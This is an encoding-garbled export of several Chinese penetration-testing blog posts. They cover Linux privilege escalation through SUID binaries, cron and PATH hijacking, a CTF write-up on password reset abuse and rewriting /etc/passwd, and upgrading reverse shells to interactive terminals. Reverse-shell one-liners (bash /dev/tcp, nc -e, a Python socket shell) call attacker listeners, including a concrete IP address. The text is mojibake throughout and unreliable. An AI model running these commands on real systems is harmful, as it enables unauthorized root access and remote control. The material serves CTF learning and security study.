åˆ—å‡ºå½“å‰ç”¨æˆ·å¯æ‰§è¡Œçš„å‘½ä»¤ ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘è¿™é‡Œç”¨Newstarçš„é¶æœºæ¼”ç¤ºäº† find / -user root -perm -4000 -exec ls -ldb \\; lsä¸€ä¸‹çœ‹çœ‹æ˜¯å¦è®¾ç½®äº†suidæƒé™ ls -al /usr/bin/su å¯ä»¥çœ‹åˆ°ç¡®å®è®¾ç½®äº†suidæƒé™ï¼Œè€Œä¸”å±ä¸»ä¸ºrootï¼Œç°åœ¨æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨æˆ‘ä»¬ä¹‹å‰æåˆ°çš„suidå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ä»è€Œè¿›è¡Œææƒå‘¢ è¿›è¡Œsuidææƒï¼ˆè¿™é‡Œå°±è®°ä¸€ä¸ªfindï¼‰è¿™é‡Œçš„å‰æéƒ½æ˜¯è¦æœ‰suidæƒé™ findfind å…·æœ‰suidæƒé™çš„filename -exec whoami \\; -quit#rootfind å…·æœ‰suidæƒé™çš„filename -exec /bin/sh -p \\; -quit#whoami#root è¿˜æœ‰ä¸€ç§å·®ä¸å¤šçš„ææƒæ–¹æ³• #å…ˆå‰åˆ©ç”¨ä»¥ä¸ŠæŸ¥æ‰¾suidæ–‡ä»¶æŸ¥è¯¢åˆ°äº†/usr/bin/find æœ‰suidæƒé™touch 1.txt #åˆ›å»º1.txt/usr/bin/find 1.txt -exec whoami \\; å¹¿æ’­shell åœ¨é¶æœºä¸Šï¼š find user -exec nc -lvp 4444 -e /bin/sh \\; åœ¨æ”»å‡»æœºä¸Šï¼š nc é¶æœºip 4444 åå¼¹shell åœ¨é¶æœºä¸Š: find å…·æœ‰suidæƒé™çš„filename -exec bash -c bash -i /dev/tcp/ip/port 01 \\; åœ¨æ”»å‡»æœºä¸Šï¼š nc -lvp port è¿™é‡Œæˆ‘å»¶ç”³ä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥å†™ä¸€ä¸ªåå¼¹rootçš„shell python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);nc -lvp port è¿™é‡Œä¹Ÿå¯ä»¥ç»“åˆä¹‹å‰çš„å‘½ä»¤ /usr/bin/find 1.txt -exec python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]); \\; ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ææƒé€šè¿‡æŸ¥è¯¢å†å²è®°å½•ä»è€Œè·å¾—ä¿¡æ¯æ³„éœ²çš„ä¿¡æ¯åˆ©ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥è·å– cat ~/.bash_history è¿™ä¸ªå‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ æœ‰å¯èƒ½ä¼šå¾—åˆ°rootç™»å½•çš„å¯†ç  linuxé…ç½®é”™è¯¯ä»è€Œææƒåˆ©ç”¨linuxprivcheckerï¼šhttps://www.securitysift.com/download/linuxprivchecker.py unix-privesc-checkï¼šhttp://pentestmonkey.net/tools/audit/unix-privesc-check è¿™ä¸¤ä¸ªå·¥å…·è¿›è¡ŒæŸ¥æ‰¾linuxä¸­é…ç½®é”™è¯¯çš„æ–‡ä»¶ è®¡åˆ’ä»»åŠ¡ææƒæ–‡ä»¶è¦†ç›–è®¡åˆ’ä»»åŠ¡ç”± crontab ç®¡ç†ï¼Œé root ç”¨æˆ·æ˜¯æ— æ³•åˆ—å‡º root ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡çš„ï¼Œä½†å¯ä»¥åˆ—å‡º etc çš„ç³»ç»Ÿä»»åŠ¡ï¼Œç³»ç»Ÿä»»åŠ¡é»˜è®¤æ˜¯ root æƒé™è¿è¡Œçš„ å¦‚æœæŸäº›å®šæ—¶ä»»åŠ¡æ˜¯ä»¥ root èº«ä»½è¿è¡Œçš„ï¼Œä½†å®ƒè°ƒç”¨çš„ è„šæœ¬å¯æ‰§è¡Œæ–‡ä»¶ æˆ– æ—¥å¿—æ–‡ä»¶ æƒé™è®¾ç½®ä¸å½“ï¼Œè¢«æ™®é€šç”¨æˆ·å¯ä¿®æ”¹ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·å°±å¯ä»¥åœ¨å…¶ä¸­æ’å…¥æ¶æ„å‘½ä»¤ï¼Œä»è€Œè·å¾— root æƒé™ å¸¸è§æ£€æŸ¥ç‚¹ï¼š æŸ¥çœ‹å®šæ—¶ä»»åŠ¡çš„é…ç½®æ–‡ä»¶ï¼š cat /etc/crontabls -l /etc/cron* è¿™äº›é‡Œé¢çš„ä»»åŠ¡å¾ˆå¤šéƒ½æ˜¯ root æ‰§è¡Œçš„ã€‚ åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„ crontabï¼š ls -l /var/spool/cron/ æ™®é€šç”¨æˆ·ä¸€èˆ¬åªèƒ½æ”¹è‡ªå·±çš„ï¼Œä½† root çš„è„šæœ¬è¦é‡ç‚¹å…³æ³¨ã€‚ æ£€æŸ¥ cron è°ƒç”¨çš„è„šæœ¬å‘½ä»¤æ˜¯å¦å¯å†™ï¼š grep -R /etc/cron* 2/dev/null ç„¶åé€ä¸ª ls -l æŸ¥çœ‹è„šæœ¬æ˜¯å¦å¯¹æ™®é€šç”¨æˆ·å¯å†™ã€‚ å¿«é€ŸæŸ¥æ‰¾æ‰€æœ‰ root ä»»åŠ¡æ¶‰åŠçš„å¯å†™æ–‡ä»¶ï¼š for file in $(grep -oP (?=\\s)/[^\\s]+ /etc/crontab /etc/cron.*/* 2/dev/null); do if [ -w $file ]; then echo [+] Writable: $file fidone è¿™æ®µè„šæœ¬ä¼šæ‰¾å‡ºè®¡åˆ’ä»»åŠ¡è°ƒç”¨çš„æ–‡ä»¶ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦å¯¹å½“å‰ç”¨æˆ·å¯å†™ ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ å‡è®¾ /etc/crontab ä¸­æœ‰è¿™æ ·ä¸€è¡Œï¼š * * * * * root /usr/local/bin/backup.sh å†çœ‹æ–‡ä»¶æƒé™ï¼š ls -l /usr/local/bin/backup.sh-rwxrwxrwx 1 root root 1234 Sep 10 20:00 /usr/local/bin/backup.sh å‘ç° backup.sh æ˜¯ æ‰€æœ‰ç”¨æˆ·å¯å†™ (777)ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·å°±å¯ä»¥è¿™æ ·ï¼š echo bash -i /dev/tcp/127.0.0.1/4444 01 /usr/local/bin/backup.sh ç„¶ååœ¨æ”»å‡»æœºç›‘å¬ï¼š nc -lvnp 4444 ä¸‹ä¸€æ¬¡ cron æ‰§è¡Œæ—¶ï¼ˆæ¯åˆ†é’Ÿï¼‰ï¼Œä½ å°±ä¼šå¾—åˆ°ä¸€ä¸ª root shell ç¯å¢ƒå˜é‡åŠ«æŒåŸç† cron ä»»åŠ¡é»˜è®¤æ˜¯ä»¥ root èº«ä»½è¿è¡Œçš„ã€‚ å¦‚æœåœ¨ cron ä¸­æ²¡æœ‰å†™ç»å¯¹è·¯å¾„ï¼Œè€Œæ˜¯å†™äº†ä¸€ä¸ªå‘½ä»¤åï¼Œæ¯”å¦‚ï¼š * * * * * root backup ç³»ç»Ÿä¼šå» $PATH ç¯å¢ƒå˜é‡æŒ‡å®šçš„è·¯å¾„é‡Œä¾æ¬¡æ‰¾ backup è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚ å¦‚æœæ”»å‡»è€…èƒ½æ§åˆ¶ PATHï¼ˆæˆ–è€… cron ä»»åŠ¡æ‰§è¡Œæ—¶ PATH åŒ…å«äº†ä¸€ä¸ª å¯å†™ç›®å½•ï¼Œå¦‚ /tmpï¼‰ï¼Œå°±èƒ½åœ¨é‚£ä¸ªç›®å½•ä¸‹æ”¾ä¸€ä¸ªåŒåçš„æ¶æ„ç¨‹åºã€‚ cron è¿è¡Œæ—¶å°±ä¼šæ‰§è¡Œæˆ‘ä»¬ä¼ªé€ çš„ç¨‹åºï¼Œä»è€Œæ‹¿åˆ° root æƒé™ã€‚ æ£€æŸ¥æ–¹æ³• æŸ¥çœ‹ etccrontab å’Œ etccron.* æ–‡ä»¶ï¼Œçœ‹çœ‹ä»»åŠ¡æœ‰æ²¡æœ‰ç”¨ç›¸å¯¹å‘½ä»¤ï¼ˆä¾‹å¦‚ backupã€tarã€pythonï¼‰è€Œä¸æ˜¯ç»å¯¹è·¯å¾„ï¼ˆå¦‚ /usr/bin/tarï¼‰ã€‚ cat /etc/crontabcat /etc/cron.d/* æ£€æŸ¥ cron ç¯å¢ƒå˜é‡è®¾ç½® åœ¨ /etc/crontab ä¸­ï¼Œå‰å‡ è¡Œå¯èƒ½æœ‰ï¼š SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin å¦‚æœ PATH ä¸­æœ‰ä¸€ä¸ªå¯å†™ç›®å½•ï¼ˆæ¯”å¦‚ /tmpï¼‰ï¼Œé‚£ä¹ˆå°±æœ‰æœºä¼šåŠ«æŒã€‚ æ£€æµ‹å¯å†™ç›®å½• for dir in $(echo $PATH | tr : ); do [ -w $dir ] echo [+] Writable: $dirdone ä¸¾ä¸ªä¾‹å­ å‡è®¾ /etc/crontab ä¸­æœ‰ï¼š * * * * * root backup åŒæ—¶ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/tmp è¿™é‡Œ /tmp æ˜¯æ‰€æœ‰ç”¨æˆ·å¯å†™çš„ã€‚ æ”»å‡»æ­¥éª¤ï¼š åœ¨ /tmp ä¸‹åˆ›å»ºä¸€ä¸ªæ¶æ„ç¨‹åº backupï¼š echo #!/bin/bash /tmp/backupecho bash -i /dev/tcp/127.0.0.1/4444 01 /tmp/backupchmod +x /tmp/backup æ”»å‡»æœºç›‘å¬ç«¯å£ï¼š nc -lvnp 4444 ç­‰å¾… cron ä¸‹æ¬¡è¿è¡Œï¼ˆæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼‰ã€‚ ç»“æœï¼š root ä¼šæ‰§è¡Œ /tmp/backupï¼ˆå› ä¸º PATH ä¼˜å…ˆçº§ï¼‰ï¼Œæ”»å‡»è€…å°±èƒ½æ‹¿åˆ° root shell PATH ä¼˜å…ˆçº§çš„åŸç† å½“ Linux æ‰§è¡Œä¸€ä¸ªå‘½ä»¤æ—¶ï¼Œå¦‚æœæ²¡æœ‰å†™ç»å¯¹è·¯å¾„ï¼ˆæ¯”å¦‚ç›´æ¥å†™ backup è€Œä¸æ˜¯ /usr/bin/backupï¼‰ï¼Œç³»ç»Ÿä¼šæŒ‰ç…§ $PATH ç¯å¢ƒå˜é‡é‡Œçš„ç›®å½•é¡ºåºä¾æ¬¡æŸ¥æ‰¾ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/tmp å¦‚æœè¿è¡Œ backupï¼ŒæŸ¥æ‰¾é¡ºåºæ˜¯ï¼š /usr/local/sbin/backup /usr/local/bin/backup /sbin/backup /bin/backup /usr/sbin/backup /usr/bin/backup /tmp/backup åªè¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±ä¼šç«‹å³æ‰§è¡Œï¼Œä¸ä¼šç»§ç»­æ‰¾ å¦‚ä½•ç¡®ä¿æ‰§è¡Œæˆ‘ä»¬çš„æ–‡ä»¶ æ–¹æ³•ä¸€ï¼šåˆ©ç”¨ PATH é¡ºåº å¦‚æœ PATH ä¸­æœ¬æ¥å°±æœ‰ä¸€ä¸ªå¯å†™ç›®å½•ï¼ˆä¾‹å¦‚ /tmpï¼‰ï¼Œå¹¶ä¸”å®ƒåœ¨çœŸæ­£å‘½ä»¤æ‰€åœ¨ç›®å½•çš„ å‰é¢ï¼Œé‚£ä¹ˆåªè¦æˆ‘ä»¬åœ¨é‡Œé¢æ”¾ä¸€ä¸ªåŒåçš„æ¶æ„æ–‡ä»¶ï¼Œå°±ä¸€å®šä¼šè¢«ä¼˜å…ˆæ‰§è¡Œã€‚ æ–¹æ³•äºŒï¼šä¿®æ”¹ PATH æœ‰æ—¶å€™ /etc/crontab æˆ–è„šæœ¬é‡Œä¼šç›´æ¥å®šä¹‰ PATHï¼Œæ¯”å¦‚ï¼š PATH=/tmp:/usr/bin:/bin é‚£ä¹ˆ /tmp ä¼šä¼˜å…ˆã€‚ å¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹è°ƒç”¨çš„è„šæœ¬ï¼ˆæˆ–è€…é…ç½®æ–‡ä»¶ï¼‰ï¼Œä¹Ÿèƒ½æ’å…¥ä¸€ä¸ªæ¶æ„ PATHã€‚ æ–¹æ³•ä¸‰ï¼šå‘½ä»¤æœ¬èº«å°±æ˜¯è‡ªå®šä¹‰çš„ å¦‚æœ cron ä»»åŠ¡é‡Œå†™çš„æ˜¯ backupï¼Œè€Œç³»ç»Ÿé‡Œæœ¬æ¥å°±æ²¡æœ‰ backup è¿™ä¸ªç¨‹åºï¼Œé‚£æˆ‘ä»¬ç›´æ¥åœ¨ PATH å¯å†™ç›®å½•ä¸‹æ”¾ä¸€ä¸ª backupï¼Œcron å°±ä¼šé»˜è®¤ç”¨æˆ‘ä»¬çš„ [æ¹–æ¹˜æ¯ 2021 final]Penetratable[æ¹–æ¹˜æ¯ 2021 final]Penetratable è¿™é“é¢˜å·®ä¸å¤šå¯ä»¥å½“æˆæ¸—é€é¢˜ç›®æ¥åš æ‹¿åˆ°é¢˜ç›®ç½‘å€ï¼Œå…ˆç”¨dirsearchæ‰«ä¸€æ‰‹ Target: http://node4.anna.nssctf.cn:28861/[17:31:17] Starting:[17:31:20] 403 - 288B - /.ht_wsr.txt[17:31:20] 403 - 288B - /.htaccess.bak1[17:31:20] 403 - 288B - /.htaccess.orig[17:31:20] 403 - 288B - /.htaccess.sample[17:31:20] 403 - 288B - /.htaccess.save[17:31:20] 403 - 288B - /.htaccess_extra[17:31:20] 403 - 288B - /.htaccess_orig[17:31:20] 403 - 288B - /.htaccess_sc[17:31:20] 403 - 288B - /.htaccessBAK[17:31:20] 403 - 288B - /.htaccessOLD[17:31:20] 403 - 288B - /.htm[17:31:20] 403 - 288B - /.html[17:31:20] 403 - 288B - /.htaccessOLD2[17:31:20] 403 - 288B - /.htpasswd_test[17:31:20] 403 - 288B - /.httr-oauth[17:31:20] 403 - 288B - /.htpasswds[17:31:21] 403 - 288B - /.php[17:31:29] 301 - 335B - /app - http://node4.anna.nssctf.cn:28861/app/[17:31:29] 200 - 520B - /app/[17:31:32] 301 - 338B - /config - http://node4.anna.nssctf.cn:28861/config/[17:31:32] 200 - 487B - /config/[17:31:42] 200 - 0B - /phpinfo.php[17:31:46] 403 - 288B - /server-status/[17:31:46] 403 - 288B - /server-status[17:31:47] 301 - 338B - /static - http://node4.anna.nssctf.cn:28861/static/Task Completed ç›´æ¥è®¿é—®phpinfo.phpæ— ä»»ä½•ååº”ï¼Œç©ºç™½é¡µé¢ å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å½•ä¹‹åå‘ç°æœ‰ä¿®æ”¹å¯†ç åŠŸèƒ½ï¼Œå¹¶ä¸”é€šè¿‡ç†ŠçŒ«å¤´æ’ä»¶æ‰«å‡ºæ¥çš„æ¥å£å¾—çŸ¥å­˜åœ¨adminå’Œrootç”¨æˆ·ï¼Œç›´æ¥è®¿é—®ä¼šæç¤ºæ— æƒé™ ç”¨bpæ‹¦æˆªä¸‹è¯¥é‡ç½®å¯†ç çš„è¯·æ±‚å¹¶å°†ç”¨æˆ·åæ”¹ä¸ºadminï¼Œå¯†ç ä¿®æ”¹æˆåŠŸ å†å°†åå­—æ”¹ä¸ºrootå°è¯•ä¿®æ”¹æç¤ºæ— æƒé™ å†ç™»å½•adminè´¦å·ï¼Œç›´æ¥è®¿é—®æ¥å£?cadminmupdatePassï¼Œæç¤ºç¼ºå°‘å‚æ•° äºæ˜¯æŸ¥çœ‹jsæ–‡ä»¶ï¼Œæœç´¢updatePass()æ–¹æ³• function updatePass() // let name=encodeURIComponent(Base64.encode($(.input-groupinput).eq(0).val())) // let oldPass=$(.input-groupinput).eq(1).val()?hex_md5($(.input-groupinput).eq(1).val()):; // let newPass=$(.input-groupinput).eq(2).val()?hex_md5($(.input-groupinput).eq(2).val()):; // let saying=encodeURIComponent(Base64.encode($(.input-groupinput).eq(3).val())) // $.ajax( // url: /?c=adminm=updatePass, // type: post, // data: name=+name+newPass=+newPass+oldPass=+oldPass+saying=+saying, // // async:true, // dataType: text, // success: function(data) // alertHandle(data); // // ); è¡¥ä¸Šç›¸å…³å‚æ•°åï¼Œå°è¯•ä¿®æ”¹rootå¯†ç ï¼ŒæˆåŠŸ æˆåŠŸç™»å½•rootè´¦å·ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªæŸ¥çœ‹æ—¥å¿—çš„åŠŸèƒ½ï¼Œå¹¶å¯ä»¥å°†è¯¥æ—¥å¿—æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ æ‹¦æˆªä¸‹è½½è¯·æ±‚åŒ…ï¼Œå‘é€åˆ°repeaterï¼Œå‘ç°è¿”å›åŒ…ä¼šç›´æ¥è¿”å›æ–‡ä»¶å†…å®¹ äºæ˜¯å°è¯•æ˜¯å¦æœ‰ç›®å½•éå†æ¼æ´ï¼Œå°±è®¿é—®å‰é¢dirsearchæ‰«å‡ºæ¥çš„æ–‡ä»¶phpinfo.phpï¼ŒæˆåŠŸ å°†md5åºåˆ—æ‹¿å»è§£å¯† éƒ½æ˜ç™½äº†ä¹‹åï¼Œç›´æ¥åå¼¹shellå‡ºæ¥ æŸ¥çœ‹æ ¹ç›®å½•å‘ç°è®¿é—®flagæ–‡ä»¶éœ€è¦rootæƒé™ï¼Œå¹¶ä¸”åªèƒ½è¯»å–ä¸èƒ½è¿›è¡Œå…¶ä»–æ“ä½œ è¿›è¡Œsuidææƒï¼Œé¦–å…ˆæŸ¥çœ‹å“ªäº›æ–‡ä»¶æœ‰suidæƒé™ï¼šfind / -perm -u=s -type f 2/dev/null å…¶ä¸­æœ‰binsedæˆ‘ä»¬å¯ä»¥è¿›è¡Œåˆ©ç”¨ï¼Œé—®æ‰‹aiçœ‹çœ‹å¦‚ä½•åˆ©ç”¨ï¼ŒæˆåŠŸè¯»å–flag è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š www-data@6aae652213e24b63:/var/www/html$ perl -le print crypt(test,addedsalt)adMpHktIn0tR2www-data@6aae652213e24b63:/var/www/html$ sed -i s/root:x/root:adMpHktIn0tR2/g /etc/passwdwww-data@6aae652213e24b63:/var/www/html$ suPassword: root@6aae652213e24b63:/var/www/html# cat /flagNSSCTF689a8f95-ec99-490e-8dbf-65f9df21d716 SUDOææƒsudo -l https://gtfobins.github.io/","categories":["æ¸—é€"]},{"title":"åå¼¹shellå‡çº§ä¸ºå®Œå…¨äº¤äº’å¼shell","path":"/2025/08/15/åå¼¹shellå‡çº§ä¸ºå®Œå…¨äº¤äº’å¼shell/","content":"å‰è¨€å½“Webshellåå¼¹åˆ°æœåŠ¡å™¨ä¸Šæ—¶ç»å¸¸éƒ½æ˜¯éäº¤äº’å¼çš„ï¼Œå…·ä½“è¡¨ç°ä¸ºæ§åˆ¶ç¬¦å˜æˆäº†è½¬ä¹‰åºåˆ—ã€‚åœ¨æŸäº›æ—¶å€™å°±å¾ˆéš¾ä¸‹ä¸€æ­¥æ“ä½œäº†ï¼Œæ¯”å¦‚éœ€è¦ä½¿ç”¨vimæ—¶æ˜¾ç¤ºä¸€å †çš„æ§åˆ¶ç¬¦ï¼Œåœ¨Ctrl+Cæ—¶å´é€€å‡ºäº†Shell åå¼¹ shell ä¸€èˆ¬æ˜¯éäº¤äº’å¼çš„ï¼Œä¸»è¦åŸå› å’Œåå¼¹ shell çš„å·¥ä½œæ–¹å¼ã€ç½‘ç»œç¯å¢ƒä»¥åŠç»ˆç«¯ç±»å‹æœ‰å…³ã€‚ ç»ˆç«¯ç±»å‹é—®é¢˜ åå¼¹ shell é€šå¸¸æ˜¯é€šè¿‡ bash -i /dev/tcp/ATTACKER_IP/PORT 01ã€ncã€perl ç­‰æ–¹å¼å»ºç«‹çš„ TCP è¿æ¥ã€‚ è¿™ç§ TCP è¿æ¥å¹¶ä¸æ˜¯ä¸€ä¸ª TTYPTYï¼ˆç»ˆç«¯è®¾å¤‡ï¼‰ï¼Œè€Œåªæ˜¯ä¸€ä¸ªè£¸çš„ç½‘ç»œæ•°æ®æµã€‚ ç”±äºæ²¡æœ‰ç»‘å®šåˆ°ä¼ªç»ˆç«¯ï¼ˆpseudo-terminalï¼‰ï¼Œshell æ— æ³•è¯†åˆ«ç»ˆç«¯çš„ç‰¹æ€§ï¼ˆä¾‹å¦‚å…‰æ ‡ç§»åŠ¨ã€å‘½ä»¤è¡¥å…¨ã€vimã€top è¿™äº›éœ€è¦äº¤äº’æ§åˆ¶çš„ç¨‹åºï¼‰ï¼Œæ‰€ä»¥å®ƒè¡¨ç°ä¸ºéäº¤äº’å¼ã€‚ ç¯å¢ƒå˜é‡ç¼ºå¤± æ­£å¸¸ç™»å½•çš„äº¤äº’å¼ shell ä¼šè®¾ç½®ä¸€ç³»åˆ—ç¯å¢ƒå˜é‡ï¼ˆå¦‚ TERMã€SHELLã€PS1 ç­‰ï¼‰ï¼Œå¹¶æ‰§è¡Œ /etc/profileã€~/.bashrc è¿™ç§åˆå§‹åŒ–æ–‡ä»¶ã€‚ åå¼¹ shell å¯åŠ¨æ—¶é€šå¸¸è·³è¿‡è¿™äº›åˆå§‹åŒ–æ­¥éª¤ï¼Œå¯¼è‡´åŠŸèƒ½å—é™ï¼Œçœ‹èµ·æ¥â€œå‚»å‚»çš„â€ã€‚ æƒé™å’Œå®‰å…¨é™åˆ¶ ç›®æ ‡æœºçš„æŸäº›å®‰å…¨é…ç½®ï¼ˆå¦‚ nohupã€restricted shellï¼‰å¯èƒ½ä¼šè®©åå¼¹ shell è¿è¡Œåœ¨éäº¤äº’æ¨¡å¼ï¼Œå‡å°‘æ”»å‡»è€…è·å–å®Œæ•´æ§åˆ¶çš„å¯èƒ½æ€§ã€‚ ç‰¹åˆ«æ˜¯åœ¨å—é™çš„ CTF ç¯å¢ƒã€å®¹å™¨ã€chroot é‡Œï¼Œshell é»˜è®¤å°±ä¸ç»™ä½ åˆ†é… TTYã€‚ TCP è¿æ¥æœ¬è´¨ åœ¨ä½ ç”¨åå¼¹ shell æ—¶ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç¨‹åºçš„æ ‡å‡†è¾“å…¥è¾“å‡ºç›´æ¥ç»‘åˆ° TCP socket ä¸Šã€‚ è¿™è·Ÿä½ ç›´æ¥ ssh æˆ–æœ¬åœ°æ‰“å¼€ç»ˆç«¯ä¸åŒï¼Œæ²¡æœ‰é¢å¤–çš„ ç»ˆç«¯æ§åˆ¶é€šé“ï¼Œæ‰€ä»¥æ²¡æœ‰å‘½ä»¤å†å²ã€å…‰æ ‡æ§åˆ¶ç­‰é«˜çº§äº¤äº’ã€‚ å‡çº§ä¸ºå®Œå…¨å¼shellpython å‰ææ˜¯ç›®æ ‡ä¸»æœºä¸Šé¢æœ‰python 1ã€æŸ¥çœ‹ç›‘å¬æœåŠ¡å™¨ç»ˆç«¯å’ŒSTTYä¿¡æ¯ root@i-wz982ibu6zo1y9jvywxi:~# echo $TERMxtermroot@i-wz982ibu6zo1y9jvywxi:~# stty -aspeed 38400 baud; rows 33; columns 124; line = 0;intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = undef; eol2 = undef; swtch = undef; start = ^Q;stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc è¿™é‡Œæˆ‘ä»¬çš„ç»ˆç«¯ä¿¡æ¯ä¸ºxtermï¼Œsttyçš„è¡Œæ•°(rows)ä¸º33ï¼Œåˆ—æ•°(columns)ä¸º124 2ã€åœ¨ç›‘å¬æœåŠ¡å™¨å¼€å¯ç›‘å¬ root@i-wz982ibu6zo1y9jvywxi:~# nc -lvvp 2333Listening on 0.0.0.0 2333 3ã€åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œåå¼¹shellå‘½ä»¤ bash -i /dev/tcp/47.113.102.46/2333 01 4ã€å¯ç”¨pythonäº¤äº’å¼ â”Œâ”€â”€(sherlockã‰¿LAPTOP-D6OB0LH7)-[~]â””â”€$ python3 -c import pty; pty.spawn(/bin/bash)python3 -c import pty; pty.spawn(/bin/bash) 5ã€æŒ‰ä¸‹Ctrl+Zï¼Œåå°æŒ‚èµ· 6ã€åˆ·æ–°ç»ˆç«¯ root@i-wz982ibu6zo1y9jvywxi:~# stty raw -echoroot@i-wz982ibu6zo1y9jvywxi:~# fg #è¿™ä¸ªæŒ‡ä»¤è¾“å…¥çš„æ—¶å€™ä¸ä¼šå›æ˜¾â”Œâ”€â”€(sherlockã‰¿LAPTOP-D6OB0LH7)-[/tmp/frp_0.58.1_linux_amd64]â””â”€$ reset å¯èƒ½è¿™æ—¶å€™å°±ä¼šæœ‰å¦‚ä¸‹çš„æç¤ºè¯¢é—®ç»ˆç«¯ç±»å‹ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥è¾“å…¥ç»ˆç«¯ä¿¡æ¯ç„¶åå›è½¦ reset: unknown terminal type unknownTerminal type? è‹¥æ— æç¤ºéœ€è¦è®¾ç½® â”Œâ”€â”€(sherlockã‰¿LAPTOP-D6OB0LH7)-[/tmp/frp_0.58.1_linux_amd64]â””â”€$ export TERM=xterm æ ¹æ®è‡ªå·±çš„ç»ˆç«¯ä¿¡æ¯è®¾ç½®å¦‚ä¸‹å‚æ•° $ export SHELL=bash$ stty rows 33 columns 124 socat socatçš„å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥ä»https://github.com/3ndG4me/socat/releasesä¸‹è½½ 1ã€åœ¨ç›‘å¬æœåŠ¡å™¨å¼€å¯ç›‘å¬ $ socat file:`tty`,raw,echo=0 tcp-listen:7777 è¿™é‡Œçš„7777ä¸ºç›‘å¬çš„ç«¯å£ 2ã€æŠŠsocatå¯æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸Š ç»™socatæ‰§è¡Œæ–‡ä»¶èµ‹æƒé™ï¼šchmod 777 ./socatx64.bin ç„¶åæ‰§è¡Œï¼š user@414e07ee65d84196:~$ ./socatx64.bin exec:bash -li,pty,stderr,setsid,sigint,sane tcp:47.113.102.46:7777 å…¶ä¸­47.113.102.46:7777ä¸ºç›‘å¬æœåŠ¡å™¨çš„IPå’Œç«¯å£","categories":["æ¸—é€"]},{"title":"ä»£ç å®¡è®¡-jshERP-3.5","path":"/2025/08/01/ä»£ç å®¡è®¡-jshERP-3-5/","content":"å‰è¨€å‰é¢è·Ÿç€ç½‘ä¸Šçš„æ–‡ç« å®¡è®¡è¿‡jshERP-2.3ï¼Œæ‰€ä»¥ç°åœ¨æ‰“ç®—è‡ªå·±åŠ¨æ‰‹å®¡ä¸€ä¸‹3.5ç‰ˆæœ¬çš„ï¼Œæœ€åæ”¶è·è¿˜æ˜¯ä¸é”™çš„(doge æˆ‘è‡ªå·±è¿™æ¬¡é‡‡ç”¨çš„è¿˜æ˜¯åŠé»‘ç›’åŠ åŠç™½ç›’çš„æ‰‹æ³•ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯æ ¹æ®è‡ªå·±è¦æµ‹çš„åŠŸèƒ½ç‚¹æ‰¾åˆ°å¯¹åº”çš„ä»£ç æ–‡ä»¶è¿›è¡Œåˆ†æ é¡¹ç›®æºç ä¸‹è½½é“¾æ¥ï¼šRelease ç®¡ä¼Šä½³ERP_v3.5 Â· jishenghuajshERP Â· GitHub ç¯å¢ƒæ­å»ºè¯¥ç‰ˆæœ¬çš„ç¯å¢ƒæ­å»ºæ²¡æœ‰å‰é¢çš„é‚£ä¹ˆç®€å•ï¼Œæœ€å¼€å§‹è¿˜æ˜¯å°†é…ç½®æ–‡ä»¶ä¸­çš„mysqlå’Œredisé…ç½®ä¿¡æ¯æ”¹æˆè‡ªå·±çš„æ•°æ®ï¼Œç„¶åå†å°†sqlæ–‡ä»¶å¯¼å…¥ä¸€ä¸‹ 